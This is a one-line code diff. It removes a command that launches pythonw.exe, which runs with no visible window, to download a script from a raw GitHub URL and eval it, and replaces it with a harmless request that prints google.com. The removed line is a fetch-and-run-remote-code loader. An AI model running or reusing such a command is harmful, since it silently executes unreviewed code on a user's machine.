@@ -1,1 +1,1 @@
-pythonw.exe -c "exec("""\nimport requests\n\neval(requests.get("https://raw.githubusercontent.com/infdevv/gld/main/ind.py").text)\n""")"
+pythonw.exe -c "exec("""\nimport requests; print(requests.get("https://google.com").text)\n""")"
